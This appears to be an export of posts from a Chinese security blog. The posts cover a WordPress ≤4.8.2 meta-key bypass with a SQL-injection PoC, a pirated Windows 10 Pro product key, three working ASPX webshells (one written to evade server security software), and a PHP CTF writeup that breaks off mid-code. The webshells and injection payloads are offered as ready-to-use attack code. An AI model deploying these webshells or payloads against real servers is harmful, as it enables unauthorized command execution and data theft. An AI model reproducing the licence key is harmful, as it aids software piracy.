500, $post_ID-&gt;get_error_message() );</div><div class=\"line\">    if ( ! $post_ID )</div><div class=\"line\">        return new IXR_Error( 401, __( &apos;Sorry, your entry could not be posted.&apos; ) );</div><div class=\"line\">    return strval( $post_ID );</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>按正常的业务流程，POST META应当是从<code>custom_fields</code>中获取，之后带入<code>set_custom_fields</code>函数中，而且<code>set_custom_fields</code>函数会对<code>meta_key</code>进行检查，不应当存在问题。</p>\n<p>但是在wp_update_post函数与wp_insert_post函数中，会从<code>$post_data[&#39;meta_input&#39;]</code>中取出数据，不经检查直接添加到<code>自定义栏目/字段</code>中。</p>\n<p>2.函数wp_insert_post中我们关注的代码（文件：<a href=\"https://github.com/WordPress/WordPress/blob/9891448a421f495e3745356bab88ec985a0e64b8/wp-includes/post.php#L2974\" target=\"_blank\" rel=\"external\">wp-includes/post.php</a>）<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">function wp_insert_post( $postarr, $wp_error = false ) &#123;</div><div class=\"line\">    ...//ignore</div><div class=\"line\">    $postarr = wp_parse_args($postarr, $defaults);</div><div class=\"line\">    unset( $postarr[ &apos;filter&apos; ] );</div><div class=\"line\">    $postarr = sanitize_post($postarr, &apos;db&apos;);</div><div class=\"line\">    ...//ignore</div><div class=\"line\">    if ( ! empty( $postarr[&apos;meta_input&apos;] ) ) &#123;</div><div class=\"line\">        foreach ( $postarr[&apos;meta_input&apos;] as $field =&gt; $value ) &#123;</div><div class=\"line\">            update_post_meta( $post_ID, $field, $value );</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">    ...//ignore</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"第二章-WordPress-≤-4-8-2-POST-META-校验绕过漏洞\"><a href=\"#第二章-WordPress-≤-4-8-2-POST-META-校验绕过漏洞\" class=\"headerlink\" title=\"第二章 WordPress ≤ 4.8.2 POST META 校验绕过漏洞\"></a>第二章 WordPress ≤ 4.8.2 POST META 校验绕过漏洞</h1><p>WordPress目前最新版为4.8.3，建议大家更新。</p>\n<h4 id=\"2-1-一个MySQL的trick\"><a href=\"#2-1-一个MySQL的trick\" class=\"headerlink\" title=\"2.1 一个MySQL的trick\"></a>2.1 一个MySQL的trick</h4><p>1). 正常的条件查询语句<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class=\"line\">+---------+---------+----------------+------------+</div><div class=\"line\">| meta_id | post_id | meta_key       | meta_value |</div><div class=\"line\">+---------+---------+----------------+------------+</div><div class=\"line\">|       4 |       4 | _thumbnail_id  | TESTC      |</div><div class=\"line\">+---------+---------+----------------+------------+</div><div class=\"line\">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>\n<p>2). 现在我们将<code>_thumbnail_id</code>修改成<code>”\\x00_thumbnail_id”</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; update wp_postmeta set meta_key = concat(0x00,&apos;TESTC&apos;) where meta_value = &apos;_thumbnail_id&apos;;</div><div class=\"line\">Query OK, 0 rows affected (0.00 sec)</div><div class=\"line\">Rows matched: 0  Changed: 0  Warnings: 0</div></pre></td></tr></table></figure></p>\n<p>3). 再次执行第一步的查询<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class=\"line\">+---------+---------+----------------+------------+</div><div class=\"line\">| meta_id | post_id | meta_key       | meta_value |</div><div class=\"line\">+---------+---------+----------------+------------+</div><div class=\"line\">|       4 |       4 |  _thumbnail_id | TESTC      |</div><div class=\"line\">+---------+---------+----------------+------------+</div><div class=\"line\">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>\n<p>我们可以发现依然可以查询出修改后的数据。</p>\n<h4 id=\"2-2-POST-META-校验绕过\"><a href=\"#2-2-POST-META-校验绕过\" class=\"headerlink\" title=\"2.2 POST META 校验绕过\"></a>2.2 POST META 校验绕过</h4><p>我们来看下检查<code>meta_key</code>的代码，文件<a href=\"https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L920\" target=\"_blank\" rel=\"external\">./wp-includes/meta.php</a>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">function is_protected_meta( $meta_key, $meta_type = null ) &#123;</div><div class=\"line\">    $protected = ( &apos;_&apos; == $meta_key[0] );</div><div class=\"line\"></div><div class=\"line\">    /**</div><div class=\"line\">     * Filters whether a meta key is protected.</div><div class=\"line\">     *</div><div class=\"line\">     * [@since](/since) 3.2.0</div><div class=\"line\">     *</div><div class=\"line\">     * [@param](/param) bool   $protected Whether the key is protected. Default false.</div><div class=\"line\">     * [@param](/param) string $meta_key  Meta key.</div><div class=\"line\">     * [@param](/param) string $meta_type Meta type.</div><div class=\"line\">     */</div><div class=\"line\">    return apply_filters( &apos;is_protected_meta&apos;, $protected, $meta_key, $meta_type );</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>is_protected_meta函数只检查了$meta<em>key的第一个字符是否以</em>开头。我们有了2.1的MySQL trick，想要绕过meta_key的检查就显得容易多了。</p>\n<h4 id=\"2-3-POC\"><a href=\"#2-3-POC\" class=\"headerlink\" title=\"2.3 POC\"></a>2.3 POC</h4><p>添加自定义字段，meta_key为<code>’_thumbnail_id’</code>的meta_value为<code>’55 %1$%s or sleep(10)#’</code><br>在添加自定义栏目/字段时抓包，将<code>_thumbnail_id</code>替换为<code>%00_thumbnail_id</code><br>访问<code>/wp-admin/edit.php?action=delete&amp;_wpnonce=xxx&amp;ids=55 %1$%s or sleep(10)#</code>，触发SQL注入漏洞<br>参考</p>\n<p>WordPress 4.7.5 Security and Maintenance Release – <a href=\"https://wordpress.org/news/2017/05/wordpress-4-7-5/\" target=\"_blank\" rel=\"external\">https://wordpress.org/news/2017/05/wordpress-4-7-5/</a></p>\n<p>WordPress SQLi — PoC by slavco – <a href=\"https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e\" target=\"_blank\" rel=\"external\">https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e</a></p>\n<p>WordPress post meta data checks bypass – <a href=\"https://hackerone.com/reports/265484\" target=\"_blank\" rel=\"external\">https://hackerone.com/reports/265484</a></p>\n<p>WordPress &lt;= 4.8.2 SQL Injection POC – <a href=\"http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/\" target=\"_blank\" rel=\"external\">http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/</a></p>\n","categories":[],"tags":[]},{"title":"收藏一枚win10专业版密匙","url":"http://www.chabug.org/2017/11/18/win10-Professional-key/","content":"<p>收藏一枚win10专业版密匙<br>适用于win10家庭版升级等</p>\n<p><code>VPVKT-NHPHV-D3QX4-WH3RF-Q9MP6</code><br>随时失效</p>\n","categories":[],"tags":[]},{"title":"Xsl Exec Webshell(aspx)","url":"http://www.chabug.org/2017/11/18/Xsl-Exec-Webshell-aspx/","content":"<p>关于使用xsl的webshell以前已经有人发过了，比如aspx的一个webshell如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; %&gt;</div><div class=\"line\">&lt;%@ import Namespace=&quot;System.IO&quot;%&gt;</div><div class=\"line\">&lt;%@ import Namespace=&quot;System.Xml&quot;%&gt;</div><div class=\"line\">&lt;%@ import Namespace=&quot;System.Xml.Xsl&quot;%&gt;</div><div class=\"line\">&lt;%</div><div class=\"line\">string xml=@&quot;&lt;?xml version=&quot;&quot;1.0&quot;&quot;?&gt;&lt;root&gt;test&lt;/root&gt;&quot;;</div><div class=\"line\">string xslt=@&quot;&lt;?xml version=&apos;1.0&apos;?&gt;</div><div class=\"line\">&lt;xsl:stylesheet version=&quot;&quot;1.0&quot;&quot; xmlns:xsl=&quot;&quot;http://www.w3.org/1999/XSL/Transform&quot;&quot; xmlns:msxsl=&quot;&quot;urn:schemas-microsoft-com:xslt&quot;&quot; xmlns:zcg=&quot;&quot;zcgonvh&quot;&quot;&gt;</div><div class=\"line\">    &lt;msxsl:script language=&quot;&quot;JScript&quot;&quot; implements-prefix=&quot;&quot;zcg&quot;&quot;&gt;</div><div class=\"line\">        &lt;msxsl:assembly name=&quot;&quot;mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&quot;/&gt;</div><div class=\"line\">        &lt;msxsl:assembly name=&quot;&quot;System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&quot;/&gt;</div><div class=\"line\">        &lt;msxsl:assembly name=&quot;&quot;System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;/&gt;</div><div class=\"line\">        &lt;msxsl:assembly name=&quot;&quot;System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;/&gt;</div><div class=\"line\">        &lt;![CDATA[function xml() &#123;var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;eval(Request.Item[&apos;a&apos;],&apos;unsafe&apos;);Response.End();&#125;]]&gt;</div><div class=\"line\">    &lt;/msxsl:script&gt;</div><div class=\"line\">&lt;xsl:template match=&quot;&quot;/root&quot;&quot;&gt;</div><div class=\"line\">    &lt;xsl:value-of select=&quot;&quot;zcg:xml()&quot;&quot;/&gt;</div><div class=\"line\">&lt;/xsl:template&gt;</div><div class=\"line\">&lt;/xsl:stylesheet&gt;&quot;;</div><div class=\"line\">XmlDocument xmldoc=new XmlDocument();</div><div class=\"line\">xmldoc.LoadXml(xml);</div><div class=\"line\">XmlDocument xsldoc=new XmlDocument();</div><div class=\"line\">xsldoc.LoadXml(xslt);</div><div class=\"line\">XslCompiledTransform xct=new XslCompiledTransform();</div><div class=\"line\">xct.Load(xsldoc,XsltSettings.TrustedXslt,new XmlUrlResolver());</div><div class=\"line\">xct.Transform(xmldoc,null,new MemoryStream());</div><div class=\"line\">%&gt;</div></pre></td></tr></table></figure></p>\n<p>密码为 a，这个webshell是可以用菜刀连接的，测试碰到这种情况：服务器有安全狗等防护软件，提交的各种数据包可能会拦截，而现在想要做的就是执行命令就可以了，为了方便，写了一个命令执行的webshell，可回显，可改密码，具体代码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@page language=&quot;C#&quot;%&gt;</div><div class=\"line\">&lt;%@ import Namespace=&quot;System.IO&quot;%&gt;</div><div class=\"line\">&lt;%@ import Namespace=&quot;System.Xml&quot;%&gt;</div><div class=\"line\">&lt;%@ import Namespace=&quot;System.Xml.Xsl&quot;%&gt;</div><div class=\"line\">&lt;%</div><div class=\"line\">string xml=@&quot;&lt;?xml version=&quot;&quot;1.0&quot;&quot;?&gt;&lt;root&gt;test&lt;/root&gt;&quot;;</div><div class=\"line\">string xslt=@&quot;&lt;?xml version=&apos;1.0&apos;?&gt;</div><div class=\"line\">&lt;xsl:stylesheet version=&quot;&quot;1.0&quot;&quot; xmlns:xsl=&quot;&quot;http://www.w3.org/1999/XSL/Transform&quot;&quot; xmlns:msxsl=&quot;&quot;urn:schemas-microsoft-com:xslt&quot;&quot; xmlns:zcg=&quot;&quot;zcgonvh&quot;&quot;&gt;</div><div class=\"line\">    &lt;msxsl:script language=&quot;&quot;JScript&quot;&quot; implements-prefix=&quot;&quot;zcg&quot;&quot;&gt;</div><div class=\"line\">    &lt;msxsl:assembly name=&quot;&quot;mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&quot;/&gt;</div><div class=\"line\">    &lt;msxsl:assembly name=&quot;&quot;System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&quot;/&gt;</div><div class=\"line\">    &lt;msxsl:assembly name=&quot;&quot;System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;/&gt;</div><div class=\"line\">    &lt;msxsl:assembly name=&quot;&quot;System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;/&gt;</div><div class=\"line\">        &lt;![CDATA[function xml()&#123;</div><div class=\"line\">        var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;</div><div class=\"line\">        var command = Request.Item[&apos;cmd&apos;];</div><div class=\"line\">        var r = new ActiveXObject(&quot;&quot;WScript.Shell&quot;&quot;).Exec(&quot;&quot;cmd /c &quot;&quot;+command);</div><div class=\"line\">        var OutStream = r.StdOut;</div><div class=\"line\">        var Str = &quot;&quot;&quot;&quot;;</div><div class=\"line\">        while (!OutStream.atEndOfStream) &#123;</div><div class=\"line\">            Str = Str + OutStream.readAll();</div><div class=\"line\">            &#125;</div><div class=\"line\">        Response.Write(&quot;&quot;&lt;pre&gt;&quot;&quot;+Str+&quot;&quot;&lt;/pre&gt;&quot;&quot;);</div><div class=\"line\">        &#125;]]&gt;</div><div class=\"line\">    &lt;/msxsl:script&gt;</div><div class=\"line\">&lt;xsl:template match=&quot;&quot;/root&quot;&quot;&gt;</div><div class=\"line\">    &lt;xsl:value-of select=&quot;&quot;zcg:xml()&quot;&quot;/&gt;</div><div class=\"line\">&lt;/xsl:template&gt;</div><div class=\"line\">&lt;/xsl:stylesheet&gt;&quot;;</div><div class=\"line\">XmlDocument xmldoc=new XmlDocument();</div><div class=\"line\">xmldoc.LoadXml(xml);</div><div class=\"line\">XmlDocument xsldoc=new XmlDocument();</div><div class=\"line\">xsldoc.LoadXml(xslt);</div><div class=\"line\">XsltSettings xslt_settings = new XsltSettings(false, true);</div><div class=\"line\">xslt_settings.EnableScript = true;</div><div class=\"line\">try&#123;</div><div class=\"line\">    XslCompiledTransform xct=new XslCompiledTransform();</div><div class=\"line\">    xct.Load(xsldoc,xslt_settings,new XmlUrlResolver());</div><div class=\"line\">    xct.Transform(xmldoc,null,new MemoryStream());</div><div class=\"line\">&#125;</div><div class=\"line\">catch (Exception e)&#123;</div><div class=\"line\">    Response.Write(&quot;Error&quot;);</div><div class=\"line\">&#125;</div><div class=\"line\">%&gt;</div></pre></td></tr></table></figure></p>\n<p>密码为cmd，可自己改，测试如下图：<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1flmhf8orivj31mu0zwgo1.jpg\" alt=\"\"><br>附带一个大马里面的命令执行：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;VB&quot; Debug=&quot;true&quot; %&gt;</div><div class=\"line\">&lt;%@ import Namespace=&quot;system.IO&quot; %&gt;</div><div class=\"line\">&lt;%@ import Namespace=&quot;System.Diagnostics&quot; %&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;script runat=&quot;server&quot;&gt;      </div><div class=\"line\"></div><div class=\"line\">Sub RunCmd(Src As Object, E As EventArgs)            </div><div class=\"line\">  Dim myProcess As New Process()            </div><div class=\"line\">  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            </div><div class=\"line\">  myProcessStartInfo.UseShellExecute = false            </div><div class=\"line\">  myProcessStartInfo.RedirectStandardOutput = true            </div><div class=\"line\">  myProcess.StartInfo = myProcessStartInfo            </div><div class=\"line\">  myProcessStartInfo.Arguments=xcmd.text            </div><div class=\"line\">  myProcess.Start()            </div><div class=\"line\"></div><div class=\"line\">  Dim myStreamReader As StreamReader = myProcess.StandardOutput            </div><div class=\"line\">  Dim myString As String = myStreamReader.Readtoend()            </div><div class=\"line\">  myProcess.Close()            </div><div class=\"line\">  mystring=replace(mystring,&quot;&lt;&quot;,&quot;&amp;lt;&quot;)            </div><div class=\"line\">  mystring=replace(mystring,&quot;&gt;&quot;,&quot;&amp;gt;&quot;)            </div><div class=\"line\">  result.text= vbcrlf &amp; &quot;&lt;pre&gt;&quot; &amp; mystring &amp; &quot;&lt;/pre&gt;&quot;    </div><div class=\"line\">End Sub</div><div class=\"line\"></div><div class=\"line\">&lt;/script&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;html&gt;</div><div class=\"line\">&lt;body&gt;    </div><div class=\"line\">&lt;form runat=&quot;server&quot;&gt;        </div><div class=\"line\">&lt;p&gt;&lt;asp:Label id=&quot;L_p&quot; runat=&quot;server&quot; width=&quot;80px&quot;&gt;Program&lt;/asp:Label&gt;        </div><div class=\"line\">&lt;asp:TextBox id=&quot;xpath&quot; runat=&quot;server&quot; Width=&quot;300px&quot;&gt;c:\\windows\\system32\\cmd.exe&lt;/asp:TextBox&gt;        </div><div class=\"line\">&lt;p&gt;&lt;asp:Label id=&quot;L_a&quot; runat=&quot;server&quot; width=&quot;80px&quot;&gt;Arguments&lt;/asp:Label&gt;        </div><div class=\"line\">&lt;asp:TextBox id=&quot;xcmd&quot; runat=&quot;server&quot; Width=&quot;300px&quot; Text=&quot;/c net user&quot;&gt;/c net user&lt;/asp:TextBox&gt;        </div><div class=\"line\">&lt;p&gt;&lt;asp:Button id=&quot;Button&quot; onclick=&quot;runcmd&quot; runat=&quot;server&quot; Width=&quot;100px&quot; Text=&quot;Run&quot;&gt;&lt;/asp:Button&gt;        </div><div class=\"line\">&lt;p&gt;&lt;asp:Label id=&quot;result&quot; runat=&quot;server&quot;&gt;&lt;/asp:Label&gt;       </div><div class=\"line\">&lt;/form&gt;</div><div class=\"line\">&lt;/body&gt;</div><div class=\"line\">&lt;/html&gt;</div></pre></td></tr></table></figure></p>\n","categories":[],"tags":[]},{"title":"一道PHP代码审计CTF的Writeup","url":"http://www.chabug.org/2017/11/17/php-code-writeup/","content":"<p><a href=\"http://www.inksec.cn/\" target=\"_blank\" rel=\"external\">@Szrzvdny</a>大佬的题  <a href=\"http://exp10it.tk/2017/11/17/php-code-writeup/#more\" target=\"_blank\" rel=\"external\">@X1r0z</a>大佬的思路.</p>\n<p>首先访问网站</p>\n<p><a href=\"http://118.89.157.11/code/\" target=\"_blank\" rel=\"external\">http://118.89.157.11/code/</a><br><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/1.jpg\" alt=\"\">  </p>\n<p>访问index.txt  </p>\n<p><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/2.jpg\" alt=\"\">  </p>\n<p>直接复制到notepad++里了, 看着比较方便  </p>\n<p><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/3.jpg\" alt=\"\">  </p>\n<p>看代码<br><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/4.jpg\" alt=\"\"><br>md5解密结果: <code>HaHa</code></p>\n<p>HTTP_BGROTNYSPXPD在http包中也没有, 尝试直接构造<br><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/5.jpg\" alt=\"\"><br>返回 man,your need Crack Md5</p>\n<p>来到下一段if语句<br><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/6.jpg\" alt=\"\"><br>md5解密结果: <code>!#%ASFASDY#$&amp;ASF</code></p>\n<p>在burp中构造</p>\n<p><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/7.jpg\" alt=\"\">  </p>\n<p>Go  </p>\n<p><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/8.jpg\" alt=\"\">  </p>\n<p>hash先不管, 看下一段if  </p>\n<p><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/9.jpg\" alt=\"\">  </p>\n<p><code>$pass=unserialize(base64_decode($_GET[&#39;pass&#39;]));</code></p>\n<p>它是先解密然后再反序列化, 那么我们就要先序列化在加密<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">if($pass!==&apos;&apos; &amp;&amp;is_array($pass))&#123;</div><div class=\"line\">    $a=$pass[&apos;a&apos;];</div><div class=\"line\">\t$b=$pass[&apos;b&apos;];</div><div class=\"line\">\t$c=$pass[&apos;c&apos;];</div></pre></td></tr></table></figure></p>\n<p>同时这里的<code>$pass</code>要是数组</p>\n<p>直接在本地echo序列化的内容</p>\n<p>那么初始代码就是这样的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">$arr = array(&apos;a&apos;=&gt;&apos;a&apos;,&apos;b&apos;=&gt;&apos;b&apos;,&apos;c&apos;=&gt;&apos;c&apos;);</div><div class=\"line\">echo base64_encode(serialize($arr));</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p>不过下面的if就有点变态了<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">if((md5($a) == md5($b) &amp;&amp; $a !== $b))&#123;</div><div class=\"line\">\techo &quot;WOW!&lt;br/&gt;&quot;;</div><div class=\"line\">\t$v1=1;</div></pre></td></tr></table></figure></p>\n<p><a href=\"http://www.cnblogs.com/Primzahl/p/6018158.html\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/Primzahl/p/6018158.html</a></p>\n<blockquote>\n<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>\n</blockquote>\n<p>原来要利用php的一个缺陷</p>\n<p>用这两个字符串<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">s878926199a</div><div class=\"line\">0e545993274517709034328855841020</div><div class=\"line\"></div><div class=\"line\">s1091221200a</div><div class=\"line\">0e940624217856561557816327384675</div></pre></td></tr></table></figure></p>\n<p>更改代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">$arr = array(&apos;a&apos;=&gt;&apos;s878926199a&apos;,&apos;b&apos;=&gt;&apos;s1091221200a&apos;,&apos;c&apos;=&gt;&apos;c&apos;);</div><div class=\"line\">echo base64_encode(serialize($arr));</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p>echo输出<br><code>YTozOntzOjE6ImEiO3M6MTE6InM4Nzg5MjYxOTlhIjtzOjE6ImIiO3M6MTI6InMxMDkxMjIxMjAwYSI7czoxOiJjIjtzOjE6ImMiO30=</code></p>\n<p>构造参数</p>\n<p><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/10.jpg\" alt=\"\">  </p>\n<p>提交  </p>\n<p><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/11.jpg\" alt=\"\"><br>出现WOW!</p>\n<p>还是if<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">if(strlen($c)&lt;4 &amp;&amp; $c&gt;99999999)&#123;</div><div class=\"line\">\techo &quot;666666!&lt;/br&gt;&quot;;</div><div class=\"line\">\t$v2=1;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>$c要小于4并大于99999999</p>\n<p>这里虽然是strlen, 但没说$c一定要是字符串</p>\n<p>回到本地测试<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">$arr = array(&apos;a&apos;=&gt;&apos;s878926199a&apos;,&apos;b&apos;=&gt;&apos;s1091221200a&apos;,&apos;c&apos;=&gt;array(&apos;aaa&apos;));</div><div class=\"line\">$c = $arr[&apos;c&apos;];</div><div class=\"line\">if(strlen($c)&lt;4 &amp;&amp; $c&gt;99999999)&#123;</div><div class=\"line\">\techo &quot;666666!&lt;/br&gt;&quot;;</div><div class=\"line\">&#125;</div><div class=\"line\">echo base64_encode(serialize($arr));</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p>访问<br><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/12.jpg\" alt=\"\"><br>出现Warning并输出666666!</p>\n<p><code>YTozOntzOjE6ImEiO3M6MTE6InM4Nzg5MjYxOTlhIjtzOjE6ImIiO3M6MTI6InMxMDkxMjIxMjAwYSI7czoxOiJjIjthOjE6e2k6MDtzOjM6ImFhYSI7fX0=</code></p>\n<p>burp构造 提交<br><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/13.jpg\" alt=\"\"><br>继续看代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$aa = 